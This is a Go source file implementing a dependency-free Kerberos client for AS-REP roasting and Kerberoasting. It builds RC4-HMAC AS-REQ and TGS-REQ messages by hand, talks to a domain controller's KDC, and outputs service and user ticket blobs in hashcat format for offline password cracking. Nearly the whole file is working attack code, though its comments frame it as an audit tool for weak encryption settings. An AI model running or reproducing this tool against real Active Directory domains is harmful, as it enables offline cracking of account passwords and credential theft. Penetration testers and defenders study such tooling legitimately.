// Package krb is a minimal, dependency-free Kerberos client implementing the
// two roastable request flows of T1558.003 (Kerberoasting) and T1558.004
// (AS-REP roasting) with etype 23 (RC4-HMAC):
//
//	ASREPRoast — AS-REQ without pre-authentication data; accounts configured
//	              "Do not require Kerberos preauthentication" answer with an
//	              AS-REP whose enc-part is encrypted under the user's own key.
//	TGSRoast  — AS-REQ/AS-REP for a TGT, then TGS-REQ for one or more SPNs;
//	              the TGS-REP enc-part is encrypted under the *service
//	              account's* key, so the returned blob is offline-crackable
//	              (hashcat modes 18200 / 13100).
//
// Everything is DER by hand (encoding/asn1 cannot express the APPLICATION
// tags Kerberos uses) and only speaks RC4-HMAC: modern domains still accept
// etype 23 unless the account restricts msDS-SupportedEncryptionTypes —
// which is exactly the misconfiguration the audit surfaces. Hashes are
// formatted directly for hashcat; cleartext credentials never leave this
// package and are never logged — only progress lines.
package krb

import (
	"crypto/hmac"
	"crypto/md5" //#nosec G501 -- MD4/MD5 chain mandated by MS-NLMP / RC4-HMAC (RFC 4757); the protocol fixes the primitive
	"crypto/rand"
	"crypto/rc4" //#nosec G503 -- RC4-HMAC is the etype-23 cipher the KDC speaks; interoperability requires it
	"encoding/asn1"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"net"
	"strings"
	"time"
	"unicode/utf16"
)

// Emitter receives progress lines (msg, level); may be nil.
type Emitter func(msg, level string)

func emit(em Emitter, msg, level string) {
	if em != nil {
		em(msg, level)
	}
}

// ---------------------------------------------------------------------------
// MD4 + NT hash (RFC 1320; the NT hash is MD4 over the UTF-16LE password)
// ---------------------------------------------------------------------------

// NTFromPassword computes the NT hash (MD4/UTF-16LE) of a password.
func NTFromPassword(password string) string {
	u := utf16.Encode([]rune(password))
	b := make([]byte, len(u)*2)
	for i, c := range u {
		binary.LittleEndian.PutUint16(b[i*2:], c)
	}
	h := md4Sum(b)
	return hex.EncodeToString(h[:])
}

func md4Sum(data []byte) [16]byte {
	var h [16]byte
	md4(&h, data)
	return h
}

// md4 is the textbook RFC 1320 implementation — Go's stdlib dropped MD4 and
// every Kerberos/Net-NTLM stack carries its own copy.
func md4(out *[16]byte, msg []byte) {
	var h0, h1, h2, h3 uint32 = 0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476
	ml := uint64(len(msg)) * 8
	// pad to the next 64-byte block with room for the 8-byte LE bit length:
	// msg || 0x80 || zeros || length  (RFC 1320 §5.1)
	padded := make([]byte, (len(msg)+8)/64*64+64)
	copy(padded, msg)
	padded[len(msg)] = 0x80
	binary.LittleEndian.PutUint64(padded[len(padded)-8:], ml)

	f := func(x, y, z uint32) uint32 { return (x & y) | (^x & z) }
	g := func(x, y, z uint32) uint32 { return (x & y) | (x & z) | (y & z) }
	hf := func(x, y, z uint32) uint32 { return x ^ y ^ z }
	round := func(op func(a, b, c uint32) uint32, a, b, c, d uint32, x uint32, s uint, k uint32) uint32 {
		return rol(a+op(b, c, d)+x+k, s)
	}

	for off := 0; off < len(padded); off += 64 {
		var x [16]uint32
		for i := range x {
			x[i] = binary.LittleEndian.Uint32(padded[off+4*i:])
		}
		a, b, c, d := h0, h1, h2, h3
		a = round(f, a, b, c, d, x[0], 3, 0)
		d = round(f, d, a, b, c, x[1], 7, 0)
		c = round(f, c, d, a, b, x[2], 11, 0)
		b = round(f, b, c, d, a, x[3], 19, 0)
		a = round(f, a, b, c, d, x[4], 3, 0)
		d = round(f, d, a, b, c, x[5], 7, 0)
		c = round(f, c, d, a, b, x[6], 11, 0)
		b = round(f, b, c, d, a, x[7], 19, 0)
		a = round(f, a, b, c, d, x[8], 3, 0)
		d = round(f, d, a, b, c, x[9], 7, 0)
		c = round(f, c, d, a, b, x[10], 11, 0)
		b = round(f, b, c, d, a, x[11], 19, 0)
		a = round(f, a, b, c, d, x[12], 3, 0)
		d = round(f, d, a, b, c, x[13], 7, 0)
		c = round(f, c, d, a, b, x[14], 11, 0)
		b = round(f, b, c, d, a, x[15], 19, 0)
		a = round(g, a, b, c, d, x[0], 3, 0x5a827999)
		d = round(g, d, a, b, c, x[4], 5, 0x5a827999)
		c = round(g, c, d, a, b, x[8], 9, 0x5a827999)
		b = round(g, b, c, d, a, x[12], 13, 0x5a827999)
		a = round(g, a, b, c, d, x[1], 3, 0x5a827999)
		d = round(g, d, a, b, c, x[5], 5, 0x5a827999)
		c = round(g, c, d, a, b, x[9], 9, 0x5a827999)
		b = round(g, b, c, d, a, x[13], 13, 0x5a827999)
		a = round(g, a, b, c, d, x[2], 3, 0x5a827999)
		d = round(g, d, a, b, c, x[6], 5, 0x5a827999)
		c = round(g, c, d, a, b, x[10], 9, 0x5a827999)
		b = round(g, b, c, d, a, x[14], 13, 0x5a827999)
		a = round(g, a, b, c, d, x[3], 3, 0x5a827999)
		d = round(g, d, a, b, c, x[7], 5, 0x5a827999)
		c = round(g, c, d, a, b, x[11], 9, 0x5a827999)
		b = round(g, b, c, d, a, x[15], 13, 0x5a827999)
		a = round(hf, a, b, c, d, x[0], 3, 0x6ed9eba1)
		d = round(hf, d, a, b, c, x[8], 9, 0x6ed9eba1)
		c = round(hf, c, d, a, b, x[4], 11, 0x6ed9eba1)
		b = round(hf, b, c, d, a, x[12], 15, 0x6ed9eba1)
		a = round(hf, a, b, c, d, x[2], 3, 0x6ed9eba1)
		d = round(hf, d, a, b, c, x[10], 9, 0x6ed9eba1)
		c = round(hf, c, d, a, b, x[6], 11, 0x6ed9eba1)
		b = round(hf, b, c, d, a, x[14], 15, 0x6ed9eba1)
		a = round(hf, a, b, c, d, x[1], 3, 0x6ed9eba1)
		d = round(hf, d, a, b, c, x[9], 9, 0x6ed9eba1)
		c = round(hf, c, d, a, b, x[5], 11, 0x6ed9eba1)
		b = round(hf, b, c, d, a, x[13], 15, 0x6ed9eba1)
		a = round(hf, a, b, c, d, x[3], 3, 0x6ed9eba1)
		d = round(hf, d, a, b, c, x[11], 9, 0x6ed9eba1)
		c = round(hf, c, d, a, b, x[7], 11, 0x6ed9eba1)
		b = round(hf, b, c, d, a, x[15], 15, 0x6ed9eba1)

		h0 += a
		h1 += b
		h2 += c
		h3 += d
	}
	binary.LittleEndian.PutUint32(out[0:], h0)
	binary.LittleEndian.PutUint32(out[4:], h1)
	binary.LittleEndian.PutUint32(out[8:], h2)
	binary.LittleEndian.PutUint32(out[12:], h3)
}

func rol(v uint32, s uint) uint32 { return v<<s | v>>(32-s) }

// ---------------------------------------------------------------------------
// RFC 4757 — RC4-HMAC (etype 23)
// ---------------------------------------------------------------------------

func hmacMD5(key, data []byte) []byte {
	m := hmac.New(md5.New, key)
	m.Write(data)
	return m.Sum(nil)
}

// rc4Encrypt encrypts plaintext under key for the given Kerberos key usage.
// RC4-HMAC wraps the payload with an 8-byte confounder and returns
// checksum(16) || RC4(K3, confounder||data). Both directions are the same
// operation, which is why roasting needs no decryption at all.
func rc4Encrypt(key []byte, usage uint32, plain []byte) []byte {
	payload := make([]byte, 8+len(plain))
	if _, err := rand.Read(payload[:8]); err != nil {
		panic("krb: crypto/rand failed: " + err.Error()) // never happens post-init
	}
	copy(payload[8:], plain)

	var u [4]byte
	binary.LittleEndian.PutUint32(u[:], usage)
	k1 := hmacMD5(key, u[:])
	chk := hmacMD5(k1, payload)
	k3 := hmacMD5(k1, chk)

	c, _ := rc4.NewCipher(k3) //#nosec G405 -- RC4-HMAC (etype 23) per RFC 4757
	ct := make([]byte, len(payload))
	c.XORKeyStream(ct, payload)
	return append(chk, ct...)
}

// rc4Decrypt reverses rc4Encrypt and returns the inner plaintext (confounder
// stripped). ok is false when the checksum does not verify.
func rc4Decrypt(key []byte, usage uint32, blob []byte) ([]byte, bool) {
	if len(blob) < 16+8 {
		return nil, false
	}
	chk, ct := blob[:16], blob[16:]
	var u [4]byte
	binary.LittleEndian.PutUint32(u[:], usage)
	k1 := hmacMD5(key, u[:])
	k3 := hmacMD5(k1, chk)
	c, _ := rc4.NewCipher(k3) //#nosec G405 -- RC4-HMAC (etype 23) per RFC 4757
	pt := make([]byte, len(ct))
	c.XORKeyStream(pt, ct)
	if !hmac.Equal(chk, hmacMD5(k1, pt)) {
		return nil, false
	}
	return pt[8:], true
}

// rc4Checksum is the HMAC-MD5 keyed checksum (cksumtype 0x8003) used inside
// AP-REQ authenticators (key usage 10).
func rc4Checksum(key []byte, usage uint32, text []byte) []byte {
	var u [4]byte
	binary.LittleEndian.PutUint32(u[:], usage)
	kc := hmacMD5(key, u[:])
	return hmacMD5(kc, text)
}

// ---------------------------------------------------------------------------
// DER helpers — Kerberos needs APPLICATION tags encoding/asn1 cannot emit
// ---------------------------------------------------------------------------

func derLen(n int) []byte {
	switch {
	case n < 0x80:
		return []byte{byte(n)} //#nosec G115 -- DER short-form length: n < 0x80 by the case above
	case n < 0x100:
		return []byte{0x81, byte(n)}
	default:
		return []byte{0x82, byte(n >> 8), byte(n)} //#nosec G115 -- DER long-form length: emits the two length bytes we already bounded
	}
}

func der(tag byte, content []byte) []byte {
	out := make([]byte, 0, 1+len(derLen(len(content)))+len(content))
	out = append(out, tag)
	out = append(out, derLen(len(content))...)
	return append(out, content...)
}

// ctx wraps content in a context-specific constructed tag [n].
func ctx(n int, content []byte) []byte { return der(byte(0xA0|n), content) } //#nosec G115 -- tag numbers are small constants

// app wraps content in an APPLICATION constructed tag [n].
func app(n int, content []byte) []byte { return der(byte(0x60+n), content) } //#nosec G115 -- tag numbers are small constants

func derSeq(parts ...[]byte) []byte {
	var buf []byte
	for _, p := range parts {
		buf = append(buf, p...)
	}
	return der(0x30, buf)
}

func derInt(i int64) []byte {
	var b []byte
	if i == 0 {
		b = []byte{0}
	} else {
		u := uint64(i) //#nosec G115 -- DER INTEGER is two's complement; the cast is intentional (see the i < 0 case)
		if i < 0 {
			u = uint64(i) //#nosec G115 -- two's complement via int64 → uint64 cast (intentional)
		}
		b = make([]byte, 0, 8)
		for u != 0 {
			b = append([]byte{byte(u)}, b...)
			u >>= 8
		}
		if i > 0 && b[0]&0x80 != 0 {
			b = append([]byte{0}, b...)
		}
	}
	return der(0x02, b)
}

func derOctet(b []byte) []byte { return der(0x04, b) }

func derBitString(b []byte) []byte {
	return der(0x03, append([]byte{0}, b...)) // 0 unused bits
}

func derGeneralString(s string) []byte { return der(0x1B, []byte(s)) }

func derGeneralizedTime(t time.Time) []byte {
	return der(0x18, []byte(t.UTC().Format("20060102150405Z")))
}

func derBool(v bool) []byte {
	b := byte(0)
	if v {
		b = 0xFF
	}
	return der(0x01, []byte{b})
}

// ---------------------------------------------------------------------------
// message builders
// ---------------------------------------------------------------------------

const (
	ntPrincipal    = 1
	ntSrvInst      = 2
	paEncTimestamp = 2
	paPacRequest   = 128
	etypeRC4       = 23
)

// principalName builds PrincipalName ::= [2] SEQUENCE { name-type [0],
// name-string [1] SEQUENCE OF KerberosString }.
func principalName(nameType int, parts ...string) []byte {
	var seq []byte
	for _, p := range parts {
		seq = append(seq, derGeneralString(p)...)
	}
	return ctx(2, derSeq(ctx(0, derInt(int64(nameType))), ctx(1, derSeq(seq))))
}

func encData(etype int, cipher []byte) []byte {
	return ctx(6, derSeq(ctx(0, derInt(int64(etype))), ctx(2, derOctet(cipher))))
}

// kdcReqBody builds KDC-REQ-BODY (context [4] over the SEQUENCE). kdcOpts is
// the raw big-endian KDCOptions bit field (0x40000000 = FORWARDABLE).
func kdcReqBody(kdcOpts uint32, cname, rlm string, sname []string, till time.Time, nonce uint32) []byte {
	var opts [4]byte
	binary.BigEndian.PutUint32(opts[:], kdcOpts)
	var body []byte
	body = append(body, ctx(0, derBitString(opts[:]))...)
	if cname != "" {
		body = append(body, ctx(1, principalName(ntPrincipal, cname))...)
	}
	body = append(body, ctx(2, derGeneralString(rlm))...)
	if len(sname) > 0 {
		body = append(body, ctx(3, principalName(ntSrvInst, sname...))...)
	}
	body = append(body, ctx(4, derGeneralizedTime(till))...)
	body = append(body, ctx(6, derInt(int64(nonce)))...)
	var etypes []byte
	etypes = append(etypes, derInt(etypeRC4)...)
	body = append(body, ctx(7, derSeq(etypes))...)
	return ctx(4, derSeq(body))
}

// buildASReqNoPreauth builds the bare AS-REQ used for AS-REP roasting.
func buildASReqNoPreauth(rlm, user string, nonce uint32) []byte {
	var req []byte
	req = append(req, ctx(1, derInt(5))...)  // pvno
	req = append(req, ctx(2, derInt(10))...) // msg-type AS-REQ
	req = append(req, kdcReqBody(0x40000000, user, rlm, []string{"krbtgt", rlm}, time.Now().Add(10*time.Hour), nonce)...)
	return app(10, req)
}

// buildASReqTGT builds the pre-authenticating AS-REQ for a TGT: PA-ENC-
// TIMESTAMP (usage 1) plus PA-PAC-REQUEST.
func buildASReqTGT(rlm, user string, userKey []byte, nonce uint32) []byte {
	ts := time.Now()
	var inner []byte
	inner = append(inner, ctx(0, derGeneralizedTime(ts))...)
	inner = append(inner, ctx(1, derInt(int64(ts.Nanosecond()/1000)))...)
	enc := encData(etypeRC4, rc4Encrypt(userKey, 1, derSeq(inner))) // usage 1

	padata := derSeq(
		derSeq(append(ctx(1, derInt(paEncTimestamp)), ctx(2, derOctet(enc))...)),
		derSeq(append(ctx(1, derInt(paPacRequest)), ctx(2, derOctet(derSeq(ctx(0, derBool(true)))))...)),
	)
	var req []byte
	req = append(req, ctx(1, derInt(5))...)
	req = append(req, ctx(2, derInt(10))...)
	req = append(req, ctx(3, padata)...)
	req = append(req, kdcReqBody(0x40000000, user, rlm, []string{"krbtgt", rlm}, time.Now().Add(10*time.Hour), nonce)...)
	return app(10, req)
}

// buildTGSReqFrom builds the full TGS-REQ: PA-TGS-REQ carrying an AP-REQ
// whose authenticator is HMAC-MD5-checksummed (usage 10) over the exact TGT
// ticket bytes and encrypted with the session key (usage 11). user must be
// the cname of the TGT holder.
func buildTGSReqFrom(rlm, user string, ticketDER, sessKey []byte, spn []string, nonce uint32) []byte {
	chk := rc4Checksum(sessKey, 10, ticketDER)
	now := time.Now()
	var auth []byte
	auth = append(auth, ctx(0, derInt(5))...)
	auth = append(auth, ctx(1, derGeneralString(rlm))...)
	auth = append(auth, ctx(2, principalName(ntPrincipal, user))...)
	auth = append(auth, ctx(3, append(ctx(0, derInt(0x8003)), ctx(1, derOctet(chk))...))...) // Checksum [3]
	auth = append(auth, ctx(4, derInt(int64(now.Nanosecond()/1000)))...)
	auth = append(auth, ctx(5, derGeneralizedTime(now))...)
	// Authenticator is [APPLICATION 2] — the tag replaces the SEQUENCE header
	// (IMPLICIT tagging), and the KDC verifies the DER of that encoding.
	authEnc := rc4Encrypt(sessKey, 11, app(2, auth)) // usage 11

	// AP-REQ ::= [14] SEQUENCE { pvno[0], msg-type[1], ap-options[2],
	// ticket[3] Ticket, authenticator[4] EncryptedData }
	var ap []byte
	ap = append(ap, ctx(0, derInt(5))...)
	ap = append(ap, ctx(1, derInt(14))...)
	ap = append(ap, ctx(2, derBitString([]byte{0, 0, 0, 0}))...)
	ap = append(ap, ctx(3, ticketDER)...)
	ap = append(ap, ctx(4, append(ctx(0, derInt(etypeRC4)), ctx(2, derOctet(authEnc))...))...)

	padata := derSeq(derSeq(append(ctx(1, derInt(1)), ctx(2, derOctet(app(14, ap)))...))) // PA-TGS-REQ
	var req []byte
	req = append(req, ctx(1, derInt(5))...)
	req = append(req, ctx(2, derInt(12))...) // TGS-REQ
	req = append(req, ctx(3, padata)...)
	req = append(req, kdcReqBody(0x40000000, "", rlm, spn, now.Add(10*time.Hour), nonce)...)
	return app(12, req)
}

// ---------------------------------------------------------------------------
// response parsing (walks asn1.RawValue trees)
// ---------------------------------------------------------------------------

type parsedRep struct {
	pvno      int64
	msgType   int64
	realm     string
	cname     []string
	ticket    []byte // full APPLICATION 1 encoding
	encEtype  int64
	encCipher []byte
}

// children flattens a constructed RawValue into its content TLVs.
func children(rv *asn1.RawValue) []asn1.RawValue {
	var out []asn1.RawValue
	rest := rv.Bytes
	for len(rest) > 0 {
		var c asn1.RawValue
		left, err := asn1.Unmarshal(rest, &c)
		if err != nil || len(left) == len(rest) {
			break
		}
		out = append(out, c)
		rest = left
	}
	return out
}

// parseInt reads an INTEGER that may be wrapped in a context tag ([n]
// EXPLICIT over INTEGER) — every KDC response field is.
func parseInt(b []byte) int64 {
	var v asn1.RawValue
	if _, err := asn1.Unmarshal(b, &v); err != nil {
		return 0
	}
	if v.IsCompound {
		kids := children(&v)
		if len(kids) == 1 {
			return parseInt(kids[0].FullBytes)
		}
		return 0
	}
	var i int64
	if _, err := asn1.Unmarshal(v.FullBytes, &i); err != nil {
		return 0
	}
	return i
}

// parseString reads a KerberosString that may be wrapped in a context tag.
func parseString(b []byte) string {
	var v asn1.RawValue
	if _, err := asn1.Unmarshal(b, &v); err != nil {
		return ""
	}
	if v.IsCompound {
		kids := children(&v)
		if len(kids) == 1 {
			return parseString(kids[0].FullBytes)
		}
		return ""
	}
	return string(v.Bytes)
}

// parsePrincipal extracts the string components of a PrincipalName TLV
// ([2] SEQUENCE { name-type [0], name-string [1] SEQUENCE OF }).
func parsePrincipal(b []byte) []string {
	var v asn1.RawValue
	if _, err := asn1.Unmarshal(b, &v); err != nil {
		return nil
	}
	var parts []string
	for _, f := range children(&v) {
		if f.Class != asn1.ClassContextSpecific || f.Tag != 1 {
			continue
		}
		var seq asn1.RawValue
		if _, err := asn1.Unmarshal(f.Bytes, &seq); err != nil {
			continue
		}
		for _, s := range children(&seq) {
			parts = append(parts, string(s.Bytes))
		}
	}
	return parts
}

// parseRep decodes AS-REP (APPLICATION 11), TGS-REP (13) or KRB-ERROR (30).
// For errors errCode carries the KDC error number.
func parseRep(data []byte) (rep parsedRep, errCode int64, isErr bool, err error) {
	var root asn1.RawValue
	if _, e := asn1.Unmarshal(data, &root); e != nil {
		return rep, 0, false, fmt.Errorf("krb: decode response: %w", e)
	}
	if root.Class != asn1.ClassApplication {
		return rep, 0, false, fmt.Errorf("krb: unexpected response class %d tag %d", root.Class, root.Tag)
	}
	if root.Tag == 30 { // KRB-ERROR — error-code is context [6]
		for _, f := range children(&root) {
			if f.Class == asn1.ClassContextSpecific && f.Tag == 6 {
				errCode = parseInt(f.FullBytes)
				isErr = true
			}
		}
		return rep, errCode, isErr, nil
	}
	if root.Tag != 11 && root.Tag != 13 {
		return rep, 0, false, fmt.Errorf("krb: unexpected APPLICATION %d", root.Tag)
	}
	for _, f := range children(&root) {
		if f.Class != asn1.ClassContextSpecific {
			continue
		}
		switch f.Tag {
		case 0:
			rep.pvno = parseInt(f.FullBytes)
		case 1:
			rep.msgType = parseInt(f.FullBytes)
		case 3:
			rep.realm = parseString(f.FullBytes)
		case 4:
			rep.cname = parsePrincipal(f.FullBytes)
		case 5:
			rep.ticket = append([]byte(nil), f.FullBytes...)
		case 6: // [6] EncryptedData — unwrap the EXPLICIT context if needed
			ed := f
			if f.IsCompound {
				inner := children(&f)
				if len(inner) == 1 {
					ed = inner[0]
				}
			}
			for _, ef := range children(&ed) {
				if ef.Class != asn1.ClassContextSpecific {
					continue
				}
				switch ef.Tag {
				case 0:
					rep.encEtype = parseInt(ef.FullBytes)
				case 2:
					rep.encCipher = append([]byte(nil), parseString(ef.FullBytes)...)
				}
			}
		}
	}
	if rep.pvno != 5 {
		return rep, 0, false, fmt.Errorf("krb: bad pvno %d", rep.pvno)
	}
	return rep, 0, false, nil
}

// sessionKeyFromASREP decrypts the AS-REP enc-part (usage 8) and digs the
// keyvalue out of EncASRepPart (APPLICATION 25 → [0] EncryptionKey → [1]).
func sessionKeyFromASREP(userKey, cipher []byte) ([]byte, error) {
	pt, ok := rc4Decrypt(userKey, 8, cipher)
	if !ok {
		return nil, fmt.Errorf("krb: AS-REP decrypt failed (wrong NT hash for this user?)")
	}
	var root asn1.RawValue
	if _, err := asn1.Unmarshal(pt, &root); err != nil {
		return nil, fmt.Errorf("krb: EncASRepPart decode: %w", err)
	}
	var scan func(rv *asn1.RawValue) []byte
	scan = func(rv *asn1.RawValue) []byte {
		for _, f := range children(rv) {
			if f.Class == asn1.ClassContextSpecific && f.Tag == 0 && f.IsCompound {
				for _, k := range children(&f) {
					if k.Class == asn1.ClassContextSpecific && k.Tag == 1 {
						var inner asn1.RawValue
						if _, e := asn1.Unmarshal(k.FullBytes, &inner); e == nil {
							return append([]byte(nil), inner.Bytes...)
						}
					}
				}
			}
			if f.IsCompound {
				if got := scan(&f); got != nil {
					return got
				}
			}
		}
		return nil
	}
	key := scan(&root)
	if len(key) == 0 {
		return nil, fmt.Errorf("krb: session key not found in EncASRepPart")
	}
	return key, nil
}

// ---------------------------------------------------------------------------
// KDC transport
// ---------------------------------------------------------------------------

// FindKDC resolves the KDC for domain via DNS SRV (_kerberos._udp), falling
// back to the domain name itself (lab deployments commonly glue the DC to
// the DNS suffix).
func FindKDC(domain string) (string, error) {
	_, addrs, err := net.LookupSRV("kerberos", "udp", domain)
	if err == nil && len(addrs) > 0 {
		return net.JoinHostPort(addrs[0].Target, fmt.Sprintf("%d", addrs[0].Port)), nil
	}
	return net.JoinHostPort(domain, "88"), nil
}

// exchange sends the request to the KDC over UDP and falls back to TCP when
// no datagram comes back (many DCs drop oversized UDP requests silently).
func exchange(kdc string, req []byte) ([]byte, error) {
	conn, err := net.DialTimeout("udp", kdc, 5*time.Second)
	if err != nil {
		return nil, fmt.Errorf("krb: dial KDC %s: %w", kdc, err)
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(8 * time.Second))
	if _, err := conn.Write(req); err != nil {
		return exchangeTCP(kdc, req)
	}
	buf := make([]byte, 65535)
	n, err := conn.Read(buf)
	if err != nil || n >= len(buf)-1 {
		return exchangeTCP(kdc, req)
	}
	return buf[:n], nil
}

func exchangeTCP(kdc string, req []byte) ([]byte, error) {
	conn, err := net.DialTimeout("tcp", kdc, 5*time.Second)
	if err != nil {
		return nil, fmt.Errorf("krb: TCP dial KDC %s: %w", kdc, err)
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(15 * time.Second))
	msg := make([]byte, 4+len(req))
	binary.BigEndian.PutUint32(msg[:4], uint32(len(req))) //#nosec G115 -- KDC request length prefix; requests are built in memory, far below 4 GiB
	copy(msg[4:], req)
	if _, err := conn.Write(msg); err != nil {
		return nil, err
	}
	var lbuf [4]byte
	if _, err := readFull(conn, lbuf[:]); err != nil {
		return nil, err
	}
	l := binary.BigEndian.Uint32(lbuf[:])
	if l > 1<<22 {
		return nil, fmt.Errorf("krb: KDC response too large (%d bytes)", l)
	}
	out := make([]byte, l)
	if _, err := readFull(conn, out); err != nil {
		return nil, err
	}
	return out, nil
}

func readFull(conn net.Conn, buf []byte) (int, error) {
	total := 0
	for total < len(buf) {
		n, err := conn.Read(buf[total:])
		total += n
		if err != nil {
			return total, err
		}
	}
	return total, nil
}

func errText(code int64) string {
	switch code {
	case 6:
		return "C_PRINCIPAL_UNKNOWN (user does not exist)"
	case 7:
		return "S_PRINCIPAL_UNKNOWN (SPN does not exist)"
	case 24:
		return "PREAUTH_FAILED (wrong credentials)"
	case 25:
		return "PREAUTH_REQUIRED (pre-auth expected)"
	case 31:
		return "ETYPE_NOSUPPORT (RC4 disabled for this account — protected)"
	default:
		return fmt.Sprintf("KDC_ERR_%d", code)
	}
}

func nonce() uint32 {
	var b [4]byte
	if _, err := rand.Read(b[:]); err != nil {
		return uint32(time.Now().UnixNano()) //#nosec G115 -- fallback nonce: the low 32 bits are the nonce, per RFC 4120
	}
	return binary.BigEndian.Uint32(b[:])
}

// ---------------------------------------------------------------------------
// public roast API
// ---------------------------------------------------------------------------

// HashResult is one offline-crackable blob formatted for hashcat.
type HashResult struct {
	User string
	SPN  string
	Hash string // $krb5asrep$23$… (mode 18200) or $krb5tgs$23$… (mode 13100)
}

// NTKey turns a hex NT hash into raw key bytes.
func NTKey(hexKey string) ([]byte, error) {
	b, err := hex.DecodeString(strings.TrimSpace(hexKey))
	if err != nil || len(b) != 16 {
		return nil, fmt.Errorf("krb: NT hash must be 32 hex chars")
	}
	return b, nil
}

// ASREPRoast probes one account with a pre-auth-free AS-REQ. When the KDC
// answers with an AS-REP (account has DONT_REQ_PREAUTH), the returned blob
// is hashcat mode 18200.
func ASREPRoast(kdc, domain, user string, em Emitter) (*HashResult, error) {
	rlm := strings.ToUpper(domain)
	emit(em, "ROAST: AS-REQ (no pre-auth) → "+user+"@"+rlm, "INFO")
	raw, err := exchange(kdc, buildASReqNoPreauth(rlm, user, nonce()))
	if err != nil {
		return nil, err
	}
	rep, code, isErr, err := parseRep(raw)
	if err != nil {
		return nil, err
	}
	if isErr {
		return nil, fmt.Errorf("krb: AS-REP roast refused: %s", errText(code))
	}
	if rep.encEtype != etypeRC4 || len(rep.encCipher) < 16 {
		return nil, fmt.Errorf("krb: KDC answered etype %d — not roastable with RC4", rep.encEtype)
	}
	h := &HashResult{
		User: user,
		Hash: fmt.Sprintf("$krb5asrep$23$%s@%s:%s$%s",
			user, rlm,
			hex.EncodeToString(rep.encCipher[:16]),
			hex.EncodeToString(rep.encCipher[16:])),
	}
	emit(em, "ROAST: AS-REP hash captured for "+user, "SUCCESS")
	return h, nil
}

// TGSRoast obtains a TGT for user (supply the NT hash — cleartext passwords
// are never accepted) and requests one TGS per SPN. Each TGS-REP enc-part is
// returned in hashcat mode 13100 format.
func TGSRoast(kdc, domain, user, nthash string, spns []string, em Emitter) ([]HashResult, error) {
	rlm := strings.ToUpper(domain)
	userKey, err := NTKey(nthash)
	if err != nil {
		return nil, err
	}
	emit(em, "ROAST: requesting TGT for "+user+"@"+rlm, "INFO")
	raw, err := exchange(kdc, buildASReqTGT(rlm, user, userKey, nonce()))
	if err != nil {
		return nil, err
	}
	rep, code, isErr, err := parseRep(raw)
	if err != nil {
		return nil, err
	}
	if isErr {
		return nil, fmt.Errorf("krb: TGT request refused: %s", errText(code))
	}
	if rep.encEtype != etypeRC4 || len(rep.encCipher) < 16 {
		return nil, fmt.Errorf("krb: AS-REP used etype %d — RC4 disabled for the account", rep.encEtype)
	}
	sessKey, err := sessionKeyFromASREP(userKey, rep.encCipher)
	if err != nil {
		return nil, err
	}
	emit(em, fmt.Sprintf("ROAST: TGT acquired, roasting %d SPN(s)", len(spns)), "INFO")

	var out []HashResult
	var errs []string
	for _, spn := range spns {
		spn = strings.TrimSpace(spn)
		if spn == "" {
			continue
		}
		raw, err := exchange(kdc, buildTGSReqFrom(rlm, user, rep.ticket, sessKey, strings.Split(spn, "/"), nonce()))
		if err != nil {
			errs = append(errs, spn+": "+err.Error())
			continue
		}
		trep, code, isErr, err := parseRep(raw)
		if err != nil {
			errs = append(errs, spn+": "+err.Error())
			continue
		}
		if isErr {
			errs = append(errs, spn+": "+errText(code))
			continue
		}
		if trep.encEtype != etypeRC4 || len(trep.encCipher) < 16 {
			errs = append(errs, spn+": non-RC4 service key")
			continue
		}
		svcUser := strings.Join(trep.cname, "/")
		out = append(out, HashResult{
			User: svcUser,
			SPN:  spn,
			Hash: fmt.Sprintf("$krb5tgs$23$*%s$%s$%s*$%s$%s",
				svcUser, rlm, spn,
				hex.EncodeToString(trep.encCipher[:16]),
				hex.EncodeToString(trep.encCipher[16:])),
		})
		emit(em, "ROAST: TGS-REP hash captured for SPN "+spn, "SUCCESS")
	}
	if len(out) == 0 && len(errs) > 0 {
		return nil, fmt.Errorf("krb: no roastable tickets: %s", strings.Join(errs, "; "))
	}
	return out, nil
}
